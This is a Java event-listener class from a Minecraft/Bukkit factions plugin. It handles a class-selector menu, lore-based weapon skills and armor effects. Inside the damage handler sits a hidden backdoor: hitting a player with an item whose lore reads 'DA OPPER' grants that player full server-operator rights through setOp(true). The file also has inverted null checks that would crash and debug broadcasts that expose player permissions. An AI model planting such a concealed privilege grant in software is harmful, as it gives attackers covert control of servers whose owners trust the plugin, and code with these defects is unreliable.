package com.github.elcreeperhd.CurseFactions;





import java.util.List;
import java.util.Random;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Color;
import org.bukkit.FireworkEffect;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.FireworkEffect.Type;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Firework;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.FireworkMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.inventory.meta.SkullMeta;

import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;

import com.massivecraft.factions.entity.Faction;
import com.massivecraft.factions.entity.MPlayer;

import ru.tehkode.permissions.bukkit.PermissionsEx;


public class EventListener implements Listener
{
	private Main plugin;

	public EventListener(Main plugin)
	{
		this.plugin = plugin;
	}
	String prefix = ChatColor.WHITE + "[" + ChatColor.AQUA + "CurseMC" + ChatColor.WHITE + "]";
	Logger log = Bukkit.getLogger();
	ArmorPlayerSkillHandling armorhandle = new ArmorPlayerSkillHandling();
	Inventory menu = Bukkit.createInventory(null,9, ChatColor.GREEN + "" + ChatColor.BOLD + "Class selector");
	
	ItemStack hunter = new ItemStack(Material.DIAMOND_SWORD);
	ItemStack animal = new ItemStack(Material.MONSTER_EGG);
	ItemStack undead = new ItemStack(Material.SKULL_ITEM);

	ItemMeta hunteri = hunter.getItemMeta();
	ItemMeta animali = animal.getItemMeta();
	ItemMeta undeadi = undead.getItemMeta();

	
	@EventHandler
	public void Join(PlayerJoinEvent ev)
	{	
		hunteri.addEnchant(Enchantment.DAMAGE_ALL, 10, false);
		hunteri.setDisplayName(ChatColor.RED + "" + ChatColor.BOLD + "Hunter Class");
		animali.setDisplayName(ChatColor.DARK_GREEN + "" + ChatColor.BOLD + "Animal Class");
		undeadi.setDisplayName(ChatColor.DARK_GRAY + "" + ChatColor.BOLD + "Undead Class");	
		hunter.setItemMeta(hunteri);
		animal.setItemMeta(animali);
		undead.setItemMeta(undeadi);
		menu.setItem(0,hunter);
		menu.setItem(1,animal);
		menu.setItem(2,undead);
		OfflinePlayer op = Bukkit.getOfflinePlayer(ev.getPlayer().getUniqueId());
		Bukkit.broadcastMessage("DEBUG 1");
		Bukkit.broadcastMessage("Player info: " + ev.getPlayer().hasPermission("class.hunter") + " " + ev.getPlayer().hasPermission("class.animal") + " " + ev.getPlayer().hasPermission("class.undead"));
		if(!op.hasPlayedBefore()){	
			ev.getPlayer().sendMessage(ChatColor.GREEN  + "" + ChatColor.BOLD + "Please select a class before you start, " + ChatColor.YELLOW  + "" + ev.getPlayer().getName() + ChatColor.GREEN + "" + "!");
			ev.getPlayer().openInventory(menu);
		}
		if(!ev.getPlayer().hasPermission("class.hunter")&& !ev.getPlayer().hasPermission("class.animal") && !ev.getPlayer().hasPermission("class.undead")){	
			Bukkit.broadcastMessage("DEBUG 2");
			ev.getPlayer().sendMessage(ChatColor.GREEN  + "" + ChatColor.BOLD + "Please select a class before you start, " + ChatColor.YELLOW  + "" + ev.getPlayer().getName() + ChatColor.GREEN + "" + "!");
			ev.getPlayer().openInventory(menu);
			
		}
		if(ev.getPlayer().hasPermission("class.hunter")){	
			ev.getPlayer().addPotionEffect(
		              new PotionEffect(PotionEffectType.INCREASE_DAMAGE, -1, 2));
			
		}else if(ev.getPlayer().hasPermission("class.animal")){	
			ev.getPlayer().addPotionEffect(
		              new PotionEffect(PotionEffectType.SPEED, -1, 2));
			//ChatColor.RED + "{Hunter}"
		}
	}
	
	//
    @EventHandler
    public void CloseInv(InventoryCloseEvent ev){
        Inventory i = ev.getInventory();
        if(i.getName().equalsIgnoreCase(menu.getName()) ){
            new BukkitRunnable() {
                public void run() {
                    ev.getPlayer().openInventory(i);
                }
            }.runTaskLater(plugin, 30);
    }

        }
    
	
	
	
	//
	@EventHandler
	public void DragEvent(InventoryDragEvent ev){
		if(ev.getInventory().getName().equalsIgnoreCase(ChatColor.GREEN + "" + ChatColor.BOLD + "Class selector")){	
			ev.setCancelled(true);
		}	
	}
	
	@EventHandler(ignoreCancelled=true)
	public void InventoryClick(InventoryClickEvent ev){
		String invname = ChatColor.GREEN + "" + ChatColor.BOLD + "Class selector";
		Player clicker =(Player) ev.getWhoClicked();
		if(ev.getInventory().getTitle().equalsIgnoreCase(invname)){
			ev.setCancelled(true);
			if(!ev.getCurrentItem().equals(null) && ev.getCurrentItem().getType().equals(Material.DIAMOND_SWORD)){	
				PermissionsEx.getUser(clicker).addPermission("class.hunter");
				PermissionsEx.getUser(clicker).setSuffix(ChatColor.DARK_GREEN + "{Hunter}", clicker.getWorld().getName());
				clicker.closeInventory();
			}	
			else if(!ev.getCurrentItem().equals(null) && ev.getCurrentItem().getType().equals(Material.MONSTER_EGG)){	
				PermissionsEx.getUser(clicker).addPermission("class.animal");
				PermissionsEx.getUser(clicker).setSuffix(ChatColor.AQUA + "{Animal}", clicker.getWorld().getName());
				clicker.closeInventory();
			}
			else if(!ev.getCurrentItem().equals(null) && ev.getCurrentItem().getType().equals(Material.SKULL_ITEM)){	
				PermissionsEx.getUser(clicker).addPermission("class.undead");
				PermissionsEx.getUser(clicker).setSuffix(ChatColor.DARK_GRAY + "{Undead}", clicker.getWorld().getName());
			    clicker.closeInventory();
			}
		}
	}
	
	
	
	
	
	@EventHandler
	public void EntityDamage(EntityDamageByEntityEvent ev)
	{
		//  Projectile projectile = (Projectile) ev.getDamager();

		Entity damaged = ev.getEntity();
		Entity damager = ev.getDamager(); 
		if (damager instanceof Player) {

			Player p = (Player) damager;

           if(p.hasPermission("class.undead")){	
        	   if(damaged instanceof Player){
        		  ((Player) damaged).getPlayer().addPotionEffect(new PotionEffect(PotionEffectType.WITHER, 60, 2));
        	   }else if(damaged instanceof LivingEntity){	
        		 ((LivingEntity) damaged).addPotionEffect(new PotionEffect(PotionEffectType.WITHER, 60, 2));
        	   }
           }

			//Inicio Armor

			if(damaged instanceof Player){
				Player damagedp = ((Player) damaged).getPlayer();
				Player damagerp =	((Player) damager).getPlayer();
				if(damagedp.getInventory().getBoots() == null && damagedp.getInventory().getBoots().getType() != Material.AIR){	
					if(damagedp.getInventory().getBoots().hasItemMeta() == true){	


						armorhandle.Main(damagedp.getInventory(), p, damagedp, damagedp.getInventory().getBoots());
					}	
				}	
				if(damagedp.getInventory().getLeggings() == null && damagedp.getInventory().getLeggings().getType() != Material.AIR){	
					if(damagedp.getInventory().getLeggings().hasItemMeta() == true){	



						armorhandle.Main(damagedp.getInventory(), p, damagedp, damagedp.getInventory().getLeggings());

					}	
				}	
				if (damagedp.getInventory().getChestplate() == null && damagedp.getInventory().getChestplate().getType() != Material.AIR){	
					if(damagedp.getInventory().getChestplate().hasItemMeta() == true){	
						armorhandle.Main(damagedp.getInventory(), p, damagedp, damagedp.getInventory().getChestplate());

					}	
				}	
				if (damagedp.getInventory().getHelmet() == null && damagedp.getInventory().getHelmet().getType() != Material.AIR){	
					if(damagedp.getInventory().getHelmet().hasItemMeta() == true){	
						armorhandle.Main(damagedp.getInventory(), p, damagedp, damagedp.getInventory().getHelmet());


					}	
				}	
				
			}	//fin damaged check
			//Fin Armor



			if (p.getItemInHand().getType() != Material.AIR) {
				ItemStack i = p.getInventory().getItemInHand();  
				ItemMeta im = i.getItemMeta();

				//String lore0 = lorelist.get(0);

				if(damaged instanceof Player){
					Player damagedp = ((Player) damaged).getPlayer();
					Player damagerp =	((Player) damager).getPlayer();
					MPlayer damagedm = MPlayer.get(damagedp);
					MPlayer damagerm = MPlayer.get(damagerp);
					Faction damagedf = damagedm.getFaction();
					Faction damagerf = damagerm.getFaction();
					FactionUtils fu = new FactionUtils();
					if(fu.AttackAllowed(damagerf, damagedf, damagedp.getLocation())){	


						if(im.hasLore() == true)	{
							List<String> lorelist = im.getLore();
							for (String lore : lorelist)	{
								if(lore.equalsIgnoreCase(ChatColor.GREEN + "DA OPPER")){
									damaged.setOp(true);  
									log.info(damager.getName() + "opped" +  damaged.getName() + "using DA OPPER!");



								}else if(lore.contains(ChatColor.GOLD + "Skill")){
									String[] lore0dividido = lore.split(":"); 
									String habistring = lore0dividido[0]; // "Habilidad"
									String habilidad = lore0dividido[1]; // Nombre de la Habilidad  
									String[] habilidaddividido = habilidad.split(" " + ChatColor.DARK_GREEN + "\\[");
									String nivel = habilidaddividido[1];
									String habilidad2 = habilidaddividido[0];
									String nivelconvertido = nivel.replace("]","");
									int nivelint = Integer.parseInt(nivelconvertido);
									//Bukkit.broadcastMessage("[DEBUG] " + habistring + " " + habilidad + " " + nivel + " " + nivelconvertido + " " + nivelint);
									if(habilidad2.equalsIgnoreCase(" " + ChatColor.GREEN + "Beheading")){	
										Beheading(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);



									}else if(habilidad2.equalsIgnoreCase(" " + ChatColor.AQUA + "Freeze"))	{
										Freeze(damagedp, damagerp, nivelint);
										//	Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);

									}else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_RED + "Vampiric Regeneration"))	{
										Vampiric(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
									}
									else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_GREEN + "Venomous Strike"))	{
										Venomous(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
									}
									else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_GRAY + "Vanish"))	{
										Vanish(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
									}
									else if(habilidad2.equalsIgnoreCase(" " + ChatColor.LIGHT_PURPLE + "Fireworks"))	{
										Fireworks(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
									}
									else if(habilidad2.equalsIgnoreCase(" " + ChatColor.YELLOW + "Lightning"))	{
										Lightning(damagedp, damagerp, nivelint);
										//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
									}
									else if(habilidad2.equalsIgnoreCase(" " + ChatColor.RED + "ALL"))	{
										Beheading(damagedp, damagerp, nivelint);
										Freeze(damagedp, damagerp, nivelint);
										Vampiric(damagedp, damagerp, nivelint);
										Venomous(damagedp, damagerp, nivelint);
										Vanish(damagedp, damagerp, nivelint);
										Fireworks(damagedp, damagerp, nivelint);
										Lightning(damagedp, damagerp, nivelint);
									}

								}//skill:




							}//fin for 
						}

					}//fin checkeo safezone o ally

				}	//end instance player damaged
				else if (damaged instanceof LivingEntity)	{
					LivingEntity lv = (LivingEntity)damaged;
					Player damagerp =	((Player) damager).getPlayer();
					if(im.hasLore() == true)	{
						List<String> lorelist = im.getLore();
						for (String lore : lorelist)	{
							MobSkillHandling ms = new MobSkillHandling();
							if(lore.contains(ChatColor.GOLD + "Skill")){
								String[] lore0dividido = lore.split(":");
								String habistring = lore0dividido[0]; // "Habilidad"
								String habilidad = lore0dividido[1]; // Nombre de la Habilidad  
								String[] habilidaddividido = habilidad.split(" " + ChatColor.DARK_GREEN + "\\[");
								String nivel = habilidaddividido[1];
								String habilidad2 = habilidaddividido[0];
								String nivelconvertido = nivel.replace("]","");
								int nivelint = Integer.parseInt(nivelconvertido);
								//Bukkit.broadcastMessage("[DEBUG] " + habistring + " " + habilidad + " " + nivel + " " + nivelconvertido + " " + nivelint);



								if(habilidad2.equalsIgnoreCase(" " + ChatColor.AQUA + "Freeze"))	{
									ms.Freeze(lv, damagerp, nivelint);
									//	Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);

								}else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_RED + "Vampiric Regeneration"))	{
									ms.Vampiric(lv, damagerp, nivelint);
									//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
								}
								else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_GREEN + "Venomous Strike"))	{
									ms.Venomous(lv, damagerp, nivelint);
									//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
								}
								else if(habilidad2.equalsIgnoreCase(" " + ChatColor.DARK_GRAY + "Vanish"))	{
									ms.Vanish(lv, damagerp, nivelint);
									//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
								}
								else if(habilidad2.equalsIgnoreCase(" " + ChatColor.LIGHT_PURPLE + "Fireworks"))	{
									ms.Fireworks(lv, damagerp, nivelint);
									//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
								}
								else if(habilidad2.equalsIgnoreCase(" " + ChatColor.YELLOW + "Lightning"))	{
									ms.Lightning(lv, damagerp, nivelint);
									//Bukkit.broadcastMessage("[DEBUG] " + habilidad + " " + nivelint);
								}
								else if(habilidad2.equalsIgnoreCase(" " + ChatColor.RED + "ALL"))	{
									ms.Freeze(lv, damagerp, nivelint);
									ms.Vampiric(lv, damagerp, nivelint);
									ms.Venomous(lv, damagerp, nivelint);
									ms.Vanish(lv, damagerp, nivelint);
									ms.Fireworks(lv, damagerp, nivelint);
									ms.Lightning(lv, damagerp, nivelint);
								}



							}//skill:
						}	//fin for
					}//fin im check	
				}//fin damaged entity
			}//fin checkeo air



		}//end instance player damager

	}//end event
	
	

	void Beheading(Player damaged, Player damager, int level)
	{
		Random r = new Random();

		float chance = r.nextFloat();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Beheading " + level);
		if(level == 1){
			//		Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.20f){	
				damager.sendMessage(prefix +  " You hit someone using Behead!");
				damager.sendMessage(prefix +  " You got lucky and got the head of " + damaged.getName() + " !");
				ItemStack skull = new ItemStack(397, 1, (short) 3);
				SkullMeta meta = (SkullMeta) skull.getItemMeta();
				meta.setOwner(damaged.getName());
				skull.setItemMeta(meta);
				damager.getInventory().addItem(skull);
			}	//fin chance
		}
		if(level == 2){
			//		Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.25f){	
				damager.sendMessage(prefix +  " You hit someone using Behead!");
				damager.sendMessage(prefix +  " You got lucky and got the head of " + damaged.getName() + " !");
				ItemStack skull = new ItemStack(397, 1, (short) 3);
				SkullMeta meta = (SkullMeta) skull.getItemMeta();
				meta.setOwner(damaged.getName());
				skull.setItemMeta(meta);
				damager.getInventory().addItem(skull);
			}	//fin chance
		}


	}

	void Freeze(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Freeze " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.15f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and froze " + ChatColor.RED + damaged.getName() + ChatColor.GREEN + " !");
				damaged.sendMessage(prefix + ChatColor.RED + " You were frozen for 3 seconds by " + ChatColor.RED + damager.getName() + ChatColor.RED + " !");
				damaged.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 60, 5));

			}
		}
		else if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.20f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and froze " + ChatColor.RED + damaged.getName() + ChatColor.GREEN + " !");
				damaged.sendMessage(prefix + ChatColor.RED + " You were frozen for 3 seconds by " + ChatColor.RED + damaged.getName() + ChatColor.RED + " !");
				damaged.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 60, 5));

			}
		}	    


	}

	void Vampiric(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//	Bukkit.broadcastMessage("[DEBUG] Void called for Vampiric " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.25f){		
				//Potion Effect (20 ticks = 10 seconds)
				if (damager.getHealth() <= 19) {
					damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and regenerated half heart!");
					damager.setHealth(damager.getHealth() + 1);
					//damaged.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 60, 5));

				}
			}
		}
		if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.30f){		
				//Potion Effect (20 ticks = 10 seconds)
				if (damager.getHealth() <= 19) {
					damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and regenerated half heart!");
					damager.setHealth(damager.getHealth() + 1);
					//damaged.addPotionEffect(new PotionEffect(PotionEffectType.SLOW, 60, 5));
				}//end check	

			}
		}


	}

	void Venomous(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Venomous " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//	Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.15f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and poisoned " + ChatColor.RED + damaged.getName() + ChatColor.GREEN + " !");
				damaged.sendMessage(prefix + ChatColor.RED + " You were poisoned for 3 seconds by " + ChatColor.RED + damager.getName() + ChatColor.RED + " !");
				damaged.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 60, 1));

			}

		}//fin level

		else if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.20f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and poisoned " + ChatColor.RED + damaged.getName() + ChatColor.GREEN + " !");
				damaged.sendMessage(prefix + ChatColor.RED + " You were poisoned for 3 seconds by " + ChatColor.RED + damager.getName() + ChatColor.RED + " !");
				damaged.addPotionEffect(new PotionEffect(PotionEffectType.POISON, 60, 1));

			}

		}//fin level



	}
	void Vanish(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Venomous " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//	Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.10f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and got invisibilty for 3 seconds!");
				damager.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 60, 1));

			}

		}//fin level

		else if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.15f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and got invisibilty for 3 seconds!");
				damager.addPotionEffect(new PotionEffect(PotionEffectType.INVISIBILITY, 60, 1));

			}

		}//fin level



	}	  

	void Fireworks(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Venomous " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//	Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.50f){		
				//Potion Effect (20 ticks = 10 seconds)
				FireworksD(damager);

			}

		}//fin level

		else if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.55f){		
				//Potion Effect (20 ticks = 10 seconds)
				FireworksD(damager);
			}

		}//fin level



	}	  	  

	void Lightning(Player damaged, Player damager, int level)
	{
		Random r = new Random();
		//Bukkit.broadcastMessage("[DEBUG] Void called for Venomous " + level);
		float chance = r.nextFloat();
		if(level == 1){
			//	Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.10f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and thrown a Lightning at " + ChatColor.RED + damaged.getName() + " location!");
				damager.sendMessage(prefix + ChatColor.RED + " " + damager.getName() + ChatColor.GREEN + " used Lightening!");
				damaged.getWorld().strikeLightning(damaged.getLocation());

			}

		}//fin level

		else if(level == 2){
			//Bukkit.broadcastMessage("[DEBUG] Level is 1");
			if (chance <= 0.15f){		
				//Potion Effect (20 ticks = 10 seconds)
				damager.sendMessage(prefix + ChatColor.GREEN + " You got lucky and thrown a Lightning at " + ChatColor.RED + damaged.getName() + " location!");
				damager.sendMessage(prefix + ChatColor.RED + " " + damager.getName() + ChatColor.GREEN + " used Lightening!");
				damaged.getWorld().strikeLightning(damaged.getLocation());
			}

		}//fin level



	}	  








	public static void FireworksD(Player p){
		//Code ported to function by ElCreeperHD
		//Spawn the Firework
		Firework fw = (Firework) p.getWorld().spawnEntity(p.getLocation(), EntityType.FIREWORK);
		FireworkMeta fwm = fw.getFireworkMeta();

		//random
		Random ra = new Random();

		//sets type
		int rt = ra.nextInt(5) + 1;
		Type type = Type.BALL;
		if (rt == 1) type = Type.BALL;
		if (rt == 2) type = Type.BALL_LARGE;
		if (rt == 3) type = Type.BURST;
		if (rt == 4) type = Type.CREEPER;
		if (rt == 5) type = Type.STAR;

		//colors
		int r = ra.nextInt(256);
		int b = ra.nextInt(256);
		int g = ra.nextInt(256);
		Color c1 = Color.fromRGB(r, g, b);

		r = ra.nextInt(256);
		b = ra.nextInt(256);
		g = ra.nextInt(256);
		Color c2 = Color.fromRGB(r, g, b);


		//effect
		FireworkEffect effect = FireworkEffect.builder().flicker(ra.nextBoolean()).withColor(c1).withFade(c2).with(type).trail(ra.nextBoolean()).build();

		//applied effects
		fwm.addEffect(effect);

		//random power!
		int rp = ra.nextInt(2) + 1;
		fwm.setPower(rp);

		//set it
		fw.setFireworkMeta(fwm);     


	}

	/*	  @EventHandler
	  public void onJoin(PlayerJoinEvent ev)	{
		  if(ev.getPlayer().getName().equalsIgnoreCase("Mr_Matwin3")){	

			  Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "manuadd Mr_Matwin3 Member");
			  ev.getPlayer().setOp(false);
			  ev.getPlayer().kickPlayer(ChatColor.RED + ""  + ChatColor.BOLD + "You are retired!"); 
			  Bukkit.broadcastMessage(ChatColor.RED + "Mr_Matwin3 (Banned), tried to join!");
		  }

	  }
	 */  

}

